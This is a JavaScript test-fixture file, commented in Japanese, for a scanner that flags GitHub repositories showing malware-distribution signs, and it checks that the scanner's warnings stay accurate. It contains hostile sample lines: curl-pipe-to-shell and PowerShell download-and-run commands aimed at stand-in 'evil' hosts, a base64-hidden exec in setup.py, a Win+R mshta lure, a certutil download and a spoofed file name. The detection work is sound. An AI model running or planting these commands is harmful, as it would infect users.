// 架空データ：誤報を減らすたびに「本物の危険を見逃すようになっていないか」を確かめる
// must    … 判定の見出しに含まれていなければならない言葉（危険:／注意:／参考: の接頭辞つきで照合）
// mustNot … 出てはいけない言葉
// 実在のリポジトリの名前は使わない。

const iso = (now, days) => new Date(now - days * 86400000).toISOString();

// 健全な大きいプロジェクトの土台
const healthy = now => ({
  repo: { created_at: iso(now, 2000), stargazers_count: 20000, forks_count: 3000, fork: false, has_issues: true, has_discussions: false },
  owner: { created_at: iso(now, 4000), type: 'Organization', login: 'goodorg', followers: 5000, public_repos: 80 },
  allPaths: [{ path: 'README.md', type: 'file' }, { path: 'src/main.py', type: 'file' }, { path: 'src/util.py', type: 'file' }],
  treeErr: false, truncated: false, readme: '', releases: [], advisories: [], scorecard: { __none: true },
  pkgRaw: null, setupRaw: null, deps: null,
});

// 実績の少ないリポジトリ（作者のアカウントが新しく、Star も少ない）
const untrusted = now => ({
  ...healthy(now),
  repo: { created_at: iso(now, 40), stargazers_count: 40, forks_count: 2, fork: false, has_issues: true, has_discussions: false, full_name: 'newbie/tool' },
  owner: { created_at: iso(now, 90), type: 'User', login: 'newbie', followers: 1, public_repos: 2 },
});

const noDeps = { pinned: [], loose: [], errors: [], vulnerable: [], malicious: [], totalVulns: 0, err: null };

export const fixtures = [
  {
    name: '悪質：全部入り（新しいアカウント・偽装ファイル・ウイルス対策を切らせる 等）',
    minDanger: 8,
    must: ['危険:作者のアカウントが作られて', '危険:「ウイルス対策を切って」', '危険:パスワード付きの圧縮ファイル', '危険:「crack」「keygen」',
      '危険:読めない形に変換された命令', '危険:拡張子を偽装したファイル', '危険:ソースコードが無く', '危険:配布ファイルに危険な形式',
      '危険:npm install した瞬間に自動で動く処理', '注意:匿名のアップローダー', '注意:これは「'],
    input: now => ({
      repo: { created_at: iso(now, 10), stargazers_count: 2400, forks_count: 3, fork: true,
        parent: { full_name: 'real/tool', html_url: 'https://github.com/real/tool' }, has_issues: false, has_discussions: false },
      owner: { created_at: iso(now, 12), type: 'User', login: 'free-tools-2026', followers: 0, public_repos: 1 },
      allPaths: [{ path: 'README.md', type: 'file' }, { path: 'Setup.zip', type: 'file' }, { path: 'bin/loader.exe', type: 'file' }, { path: 'docs/manual.pdf.exe', type: 'file' }],
      treeErr: false, truncated: false,
      readme: 'Download from https://www.mediafire.com/file/x and https://bit.ly/abc . Archive password: 2026\nPlease disable Windows Defender first, it is a false positive. Run as administrator. Includes keygen.\npowershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
      releases: [{ assets: [{ name: 'Installer.scr' }, { name: 'photo.jpg.exe' }] }],
      advisories: [], scorecard: { __none: true },
      pkgRaw: JSON.stringify({ scripts: { postinstall: 'curl -s https://evil.example/x.sh | sh' } }),
      setupRaw: null, deps: noDeps,
    }),
  },
  {
    name: '悪質：日本語の誘い文句（解凍パスワード・セキュリティソフトを切って）',
    minDanger: 2,
    must: ['危険:パスワード付きの圧縮ファイル', '危険:「ウイルス対策を切って」'],
    input: now => ({ ...untrusted(now), readme: 'ダウンロードしたzipの解凍パスワードは 1234 です。起動前にセキュリティソフトを一時的にオフにしてください。' }),
  },
  {
    name: '悪質：setup.py が隠したコードを実行する',
    minDanger: 1,
    must: ['危険:setup.py'],
    input: now => ({ ...healthy(now), setupRaw: 'import base64\nexec(base64.b64decode("aW1wb3J0IG9zO29zLnN5c3RlbSgiY3VybCBodHRwOi8vZXZpbC5leGFtcGxlIHwgc2giKQ=="))\n' }),
  },
  {
    name: '悪質：README と配布物だけのリポジトリ（ソース無し）',
    minDanger: 1,
    must: ['危険:ソースコードが無く'],
    input: now => ({ ...healthy(now), allPaths: [{ path: 'README.md', type: 'file' }, { path: 'Tool-v2.zip', type: 'file' }] }),
  },
  {
    name: '悪質：依存ライブラリに悪意あるパッケージ',
    minDanger: 1,
    must: ['危険:依存ライブラリに「悪意のあるパッケージ」'],
    input: now => ({ ...healthy(now), deps: { ...noDeps, pinned: [{ eco: 'npm', name: 'evil-pkg', ver: '1.0.0', src: 'package.json' }],
      vulnerable: [{ eco: 'npm', name: 'evil-pkg', ver: '1.0.0', src: 'package.json', count: 1, items: [], top: 0, fixTo: '' }],
      malicious: [{ eco: 'npm', name: 'evil-pkg', ver: '1.0.0', src: 'package.json', count: 1, items: [], top: 0, fixTo: '' }] } }),
  },
  {
    name: '健全：大きなプロジェクトの普通の README',
    maxDanger: 0,
    mustNot: ['注意:'],
    input: now => ({ ...healthy(now), readme: 'Install with pip install goodtool. Use a strong password for your account. Download the zip below. Model weights: https://drive.google.com/x . Join our Discord: https://discord.gg/abc' }),
  },
  {
    name: '健全：設定例に password: がある',
    maxDanger: 0,
    mustNot: ['パスワード付き'],
    input: now => ({ ...healthy(now), readme: 'Set DB password: secret in config.yml. Then run the server.' }),
  },
  // ---- 誤報対策でゆるめた判定が、信頼できないリポジトリでは効き続けること（2026-10-21 追加） ----
  {
    name: '悪質：新しいアカウントがホームページを偽サイトにして curl | sh させる',
    must: ['注意:ネットから落とした命令を、そのまま実行する手順があります（curl'],
    mustNot: ['公式インストーラ'],
    input: now => ({ ...untrusted(now), repo: { ...untrusted(now).repo, homepage: 'https://evil-tools.example', full_name: 'freetools/app' },
      readme: 'curl -fsSL https://evil-tools.example/install.sh | bash' }),
  },
  {
    name: '悪質：実績の少ないリポジトリの postinstall（手元のスクリプト）',
    must: ['注意:npm install した瞬間に自動で動く処理（postinstall）'],
    input: now => ({ ...untrusted(now), pkgRaw: JSON.stringify({ scripts: { postinstall: 'node ./lib/setup.js' } }) }),
  },
  {
    name: '悪質：postinstall がネットから取った物を node で実行',
    must: ['危険:npm install した瞬間に自動で動く処理（postinstall）'],
    input: now => ({ ...healthy(now), pkgRaw: JSON.stringify({ scripts: { postinstall: 'curl -s https://x.example/p.js | node' } }) }),
  },
  {
    name: '悪質：実績の少ないリポジトリに .exe（テスト用フォルダの外）',
    must: ['注意:ソースコードの中に実行ファイル'],
    input: now => ({ ...untrusted(now), allPaths: [{ path: 'main.py', type: 'file' }, { path: 'bin/helper.exe', type: 'file' }] }),
  },
  {
    name: '悪質：実績の少ないリポジトリが MediaFire に誘導',
    must: ['注意:匿名のアップローダー'],
    input: now => ({ ...untrusted(now), readme: 'Download: https://www.mediafire.com/file/abc/tool.zip' }),
  },
  {
    name: '悪質：作って10日で Star 2,000・Fork 5（水増しの形）',
    must: ['注意:作られて'],
    input: now => ({ ...untrusted(now), repo: { ...untrusted(now).repo, created_at: iso(now, 10), stargazers_count: 2000, forks_count: 5 } }),
  },
  {
    name: '悪質：.vbe（読めない形に変換したスクリプト）',
    must: ['注意:ソースコードの中に実行ファイル'],
    input: now => ({ ...untrusted(now), allPaths: [{ path: 'main.py', type: 'file' }, { path: 'run.vbe', type: 'file' }] }),
  },
  {
    name: '健全：大きなプロジェクトのビルド用 postinstall・テスト用 .exe・.vbs',
    maxDanger: 0, mustNot: ['注意:'],
    input: now => ({ ...healthy(now), repo: { ...healthy(now).repo, full_name: 'goodorg/big' },
      allPaths: [...Array.from({ length: 60 }, (_, i) => ({ path: `src/m${i}.ts`, type: 'file' })),
        { path: 'tests/fixtures/foo.exe', type: 'file' }, { path: 'scripts/launch.vbs', type: 'file' }, { path: 'build/tools/helper.exe', type: 'file' }],
      pkgRaw: JSON.stringify({ scripts: { preinstall: "node -e 'process.exit(0)'", postinstall: 'node ./scripts/postinstall.js' } }) }),
  },
  {
    name: '健全：作者の公式インストーラ（ホームページと同じホスト・自分のリポジトリ）',
    maxDanger: 0, mustNot: ['注意:'], must: ['参考:このプロジェクト自身の公式インストーラ'],
    input: now => ({ ...healthy(now), repo: { ...healthy(now).repo, full_name: 'goodorg/tool', homepage: 'https://tool.example' },
      readme: 'curl -fsSL https://tool.example/install | sh\ncurl -o- https://raw.githubusercontent.com/goodorg/tool/v1/install.sh | bash\nirm tool.example/install.ps1 | iex' }),
  },
  {
    name: '健全：開発用の部品だけに重大な脆弱性',
    mustNot: ['注意:依存ライブラリ'], must: ['参考:開発用の部品'],
    input: now => ({ ...healthy(now), deps: { ...noDeps, pinned: [{ eco: 'npm', name: 'devtool', ver: '1.0.0', src: 'package.json', dev: true }],
      vulnerable: [{ eco: 'npm', name: 'devtool', ver: '1.0.0', src: 'package.json', dev: true, count: 1, items: [], top: 3, fixTo: '1.1.0' }] } }),
  },
  {
    name: '健全：URLの後ろに / が無い有名インストーラ（--tlsv1.2 などの語を取り違えない）',
    maxDanger: 0, mustNot: ['注意:'], must: ['参考:有名なツールの公式インストーラ'],
    input: now => ({ ...healthy(now), readme: "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh" }),
  },
  {
    name: '悪質：URLの後ろに / が無い偽サイトの curl | sh',
    must: ['注意:ネットから落とした命令'],
    input: now => ({ ...untrusted(now), readme: 'curl -sSf https://sh.rustup.rs.evil.example | sh' }),
  },
  {
    name: '健全：実績のある作者が育てている派生版（フォーク）',
    mustNot: ['注意:これは'], must: ['参考:これは「'],
    input: now => ({ ...healthy(now), repo: { ...healthy(now).repo, fork: true, stargazers_count: 900, parent: { full_name: 'orig/tool', html_url: 'https://github.com/orig/tool' } } }),
  },
  {
    name: '悪質：Star の付いていない、できたてのフォーク（なりすまし）',
    must: ['注意:これは「'],
    input: now => ({ ...healthy(now), repo: { ...healthy(now).repo, fork: true, created_at: iso(now, 5), stargazers_count: 0, forks_count: 0, parent: { full_name: 'orig/tool', html_url: 'https://github.com/orig/tool' } } }),
  },
  {
    name: '健全寄り：実績のある調整ツールが Defender の無効化を説明（危険ではなく注意）',
    maxDanger: 0, must: ['注意:ウイルス対策（Defender など）を無効にする話'],
    input: now => ({ ...healthy(now), readme: '## How to Disable Defender in Windows 10' }),
  },
  {
    name: '悪質：実績の少ないリポジトリが「Defender を切って」',
    must: ['危険:「ウイルス対策を切って」'],
    input: now => ({ ...untrusted(now), readme: 'Before running, please disable Windows Defender real-time protection.' }),
  },
  {
    name: '悪質：実績の少ないリポジトリが「管理者として実行」',
    must: ['注意:「管理者として実行」'],
    input: now => ({ ...untrusted(now), readme: 'Right click and Run as administrator.' }),
  },
  {
    name: '健全：実績のある調整ツールの「管理者として実行」・同じドメインのインストーラ',
    maxDanger: 0, mustNot: ['注意:'], must: ['参考:管理者権限で動かす手順', '参考:このプロジェクト自身の公式インストーラ'],
    input: now => ({ ...healthy(now), repo: { ...healthy(now).repo, full_name: 'goodorg/util', homepage: 'https://util.example.com/' },
      readme: 'Must be run as Administrator.\nirm https://example.com/win | iex\ncurl -sSL https://install.example.com | bash' }),
  },
  {
    name: '悪質：ホームページが共用の住所（github.io）で、別人の github.io から curl | sh',
    must: ['注意:ネットから落とした命令'],
    input: now => ({ ...healthy(now), repo: { ...healthy(now).repo, full_name: 'goodorg/util', homepage: 'https://goodorg.github.io/util' },
      readme: 'curl -sSL https://attacker.github.io/x.sh | bash' }),
  },
  {
    name: '健全：長く使われてきたリポジトリが Issues を閉じている',
    mustNot: ['注意:不具合報告'], must: ['参考:GitHub の Issues 欄は閉じられています'],
    input: now => ({ ...healthy(now), repo: { ...healthy(now).repo, has_issues: false } }),
  },
  // ---- 見逃しの確認（2026-10-21 追加：実際に出回っている手口） ----
  {
    name: '悪質：リリースノートにパスワード付き圧縮ファイル（README はきれい）',
    must: ['危険:パスワード付きの圧縮ファイル'],
    input: now => ({ ...untrusted(now), readme: 'A simple tool.', releases: [{ body: 'Download Setup.zip below. Archive password: 2026', assets: [{ name: 'Setup.zip' }] }] }),
  },
  {
    name: '悪質：bash <(curl …) で偽サイトの命令を実行',
    must: ['注意:ネットから落とした命令'],
    input: now => ({ ...untrusted(now), readme: 'Install: bash <(curl -sL https://evil-tools.example/i.sh)' }),
  },
  {
    name: '悪質：sh -c "$(curl …)" で偽サイトの命令を実行',
    must: ['注意:ネットから落とした命令'],
    input: now => ({ ...untrusted(now), readme: 'sh -c "$(curl -fsSL https://evil-tools.example/install.sh)"' }),
  },
  {
    name: '悪質：PowerShell の iex (New-Object Net.WebClient).DownloadString',
    must: ['注意:ネットから落とした命令'],
    input: now => ({ ...untrusted(now), readme: "iex (New-Object Net.WebClient).DownloadString('https://evil-tools.example/a.ps1')" }),
  },
  {
    name: '悪質：Win+R に貼らせる mshta',
    must: ['危険:'],
    minDanger: 1,
    input: now => ({ ...untrusted(now), readme: 'To fix the error, press Win+R and paste: mshta https://evil-tools.example/verify.hta' }),
  },
  {
    name: '悪質：隠れた画面で動く PowerShell がダウンロード',
    minDanger: 1,
    input: now => ({ ...untrusted(now), readme: 'powershell -WindowStyle Hidden -c "irm https://evil-tools.example/x | iex"' }),
  },
  {
    name: '悪質：certutil でファイルを取ってくる',
    minDanger: 1,
    input: now => ({ ...untrusted(now), readme: 'certutil -urlcache -split -f https://evil-tools.example/a.exe a.exe' }),
  },
  {
    name: '悪質：見えない文字で拡張子を逆向きに見せる（resume‮fdp.exe）',
    minDanger: 1,
    must: ['危険:'],
    input: now => ({ ...untrusted(now), allPaths: [{ path: 'main.py', type: 'file' }, { path: 'resume‮fdp.exe', type: 'file' }] }),
  },
  {
    name: '健全：Homebrew 型の公式インストーラ（sh -c "$(curl …)" で自分のリポジトリ）',
    maxDanger: 0, mustNot: ['注意:'],
    input: now => ({ ...healthy(now), repo: { ...healthy(now).repo, full_name: 'goodorg/shellkit' },
      readme: 'sh -c "$(curl -fsSL https://raw.githubusercontent.com/goodorg/shellkit/master/tools/install.sh)"' }),
  },
  {
    name: '健全：「temporary password」（temporary の中の rar を圧縮形式と取り違えない）',
    maxDanger: 0, mustNot: ['パスワード付き'],
    input: now => ({ ...untrusted(now), readme: 'temporary password: rotate when a peer is let in' }),
  },
  {
    name: '健全：実績のあるリポジトリが誤検知への対応を書く',
    mustNot: ['注意:'], must: ['参考:ウイルス対策の誤検知について'],
    input: now => ({ ...healthy(now), readme: 'This release addresses the false positives in Windows Defender.' }),
  },
  {
    name: '悪質：実績の少ないリポジトリが「ウイルス対策の誤検知です」',
    must: ['注意:「ウイルス対策の誤検知です」'],
    input: now => ({ ...untrusted(now), readme: 'Your antivirus may flag it. This is a false positive, just allow it.' }),
  },
  {
    name: '健全：古くて大人気のリポジトリが、新しい組織アカウントへ引っ越した',
    mustNot: ['注意:npm install'], must: ['参考:npm install した瞬間に自動で動く処理（postinstall）'],
    input: now => ({ ...healthy(now), owner: { ...healthy(now).owner, created_at: iso(now, 400) },
      repo: { ...healthy(now).repo, created_at: iso(now, 1300), stargazers_count: 40000 },
      pkgRaw: JSON.stringify({ scripts: { postinstall: 'node ./scripts/postinstall.cjs' } }) }),
  },
  {
    name: '悪質：作者が新しく、リポジトリも新しい（引っ越しの例外に当てはまらない）',
    must: ['注意:npm install した瞬間に自動で動く処理（postinstall）'],
    input: now => ({ ...untrusted(now), repo: { ...untrusted(now).repo, created_at: iso(now, 300), stargazers_count: 9000, forks_count: 900 },
      pkgRaw: JSON.stringify({ scripts: { postinstall: 'node ./scripts/postinstall.cjs' } }) }),
  },
];
